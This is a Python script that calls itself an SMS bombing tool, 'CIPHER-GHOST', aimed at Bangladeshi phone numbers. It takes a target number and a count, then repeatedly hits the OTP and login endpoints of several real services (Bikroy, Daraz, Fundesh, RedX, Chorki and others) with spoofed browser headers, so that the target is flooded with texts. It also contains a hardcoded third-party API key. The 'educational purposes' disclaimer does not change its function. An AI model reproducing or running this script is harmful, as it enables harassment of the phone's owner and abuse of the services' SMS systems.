import os,time,requests
os.system("clear")

print("""\033[1;32m     ▀▄▀▄▀▄CIPHER-GHOST▄▀▄▀▄▀
    
	  System Maker :: CIPHER-GHOST	         
\033[1;31m══════════════════════════════════════════════════
\033[1;33m[•] Tool Name    : Powerful SMS Bombing
[•] Developed By : CIPHER-GHOST
[•] GitHub       : github.com/cipher-ghost-amf
[•] Version      : 1.3.7
[•] Status       : ONLINE
[•] Telegram     : ghust_hub1_bot
FB PAGE   		: GHOST HUB 
\033[1;31m══════════════════════════════════════════════════
\033[1;36m[!] This tool is only applicable for Bangladesh.
[!] Use responsibly. Only for educational purposes.
\033[1;31m★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★\033[0m
""")


num = input(" \033[1;32mEnter Target Number (without +88): ")
am = int(input("\n Enter Amount : "))
time.sleep(1)
sent = 0
while sent < am:
    # Bikroy.com API
    headers = {
        'authority': 'bikroy.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'bn',
        'application-name': 'web',
        'referer': 'https://bikroy.com/bn/users/login',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 14; RMX3760) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    
    response = requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login?phone='+num, headers=headers)
    if response.status_code == 200:
        sent += 1
        print(f"{sent}. [√] SMS Sent Successfully...")
    else:
        pass

    # Daraz API
    headers = {
        'authority': 'dz.mmstat.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://www.daraz.com.bd/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 14; RMX3760) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    
    response = requests.get('https://dz.mmstat.com/laz_member.login_by_otp.send_phone_code_sms_click'+num, headers=headers)
    if response.status_code == 200:
        sent += 1
        print(f"{sent}. [√] SMS Sent Successfully...")
    else:
        pass

    # Fundesh API
    headers = {
        'authority': 'fundesh.com.bd',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fundesh.com.bd',
        'referer': 'https://fundesh.com.bd/fundesh/profile',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 14; RMX3760) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    
    response = requests.post('https://fundesh.com.bd/api/auth/generateOTP?phone='+num, headers=headers)
    if response.status_code == 200:
        sent += 1
        print(f"{sent}. [√] SMS Sent Successfully...")
    else:
        pass

    # Quizgiri API
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-type': 'application/json',
        'Origin': 'https://app.quizgiri.com.bd',
        'Referer': 'https://app.quizgiri.com.bd/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14; RMX3760) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-api-key': 'gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G',
    }
    
    response = requests.get('https://developer.quizgiri.xyz/api/v2.0/is-profile-completed'+num, headers=headers)
    if response.status_code == 200:
        sent += 1
        print(f"{sent}. [√] SMS Sent Successfully...")
    else:
        pass

    # Redx API
    headers = {
        'authority': 'api.redx.com.bd',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'origin': 'https://redx.com.bd',
        'referer': 'https://redx.com.bd/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 14; RMX3760) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    
    response = requests.get('https://api.redx.com.bd/v4/redx/does-user-exist'+num, headers=headers)
    if response.status_code == 200:
        sent += 1
        print(f"{sent}. [√] SMS Sent Successfully...")
    else:
        pass

    # Hoichoi API
    headers = {
        'authority': 'prod-api.hoichoi.dev',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.hoichoi.tv',
        'referer': 'https://www.hoichoi.tv/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 14; RMX3760) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    
    response = requests.post('https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code'+num, headers=headers)
    if response.status_code == 200:
        sent += 1
        print(f"{sent}. [√] SMS Sent Successfully...")
    else:
        pass

    # Chorki API
    headers = {
        'authority': 'api-dynamic.chorki.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://www.chorki.com',
        'referer': 'https://www.chorki.com/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 14; RMX3760) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    
    response = requests.post('https://api-dynamic.chorki.com/v2/auth/login?phone='+num, headers=headers)
    if response.status_code == 200:
        sent += 1
        print(f"{sent}. [√] SMS Sent Successfully...")
    else:
        pass

print("\n\033[1;36mSMS Bombing Completed...✅")